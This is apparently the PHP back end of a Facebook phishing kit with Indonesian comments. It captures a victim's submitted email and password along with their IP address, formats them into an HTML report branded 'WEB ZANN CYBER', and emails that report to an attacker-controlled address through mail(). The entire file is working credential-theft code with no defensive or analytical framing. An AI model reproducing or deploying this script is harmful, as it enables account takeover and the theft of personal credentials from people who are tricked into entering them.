<?php 
include 'UserAgent.php';
include 'daerah.php';

// MENANGKAP DATA YANG DI-INPUT
$emailfb = $_POST['email'];
$passwordfb = $_POST['sandi'];
$ipaddress = $alex['query'];

// KONTEN RESULT AKUN
$subjek = "Result | Punya si $emailfb";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #450F16;
				border: 2px solid #FF011E;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #FF011E;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
<tr>
					<th style="text-align: center;" colspan="3"> Info Facebook </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email</td>
					<td style="text-align: center;">$emailfb</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$passwordfb</td>
				</tr>
				<tr>
					<td style="border-right: none;">Alamat IP</td>
					<td style="text-align: center;">$ipaddress</td>
				</tr>
				<tr>			
					<th style="text-align: center;" colspan="3">&copy; -•°WEB ZANN CYBER°•-</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
include 'mailman.php';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($alexhost, $subjek, $pesan, $headers);

?>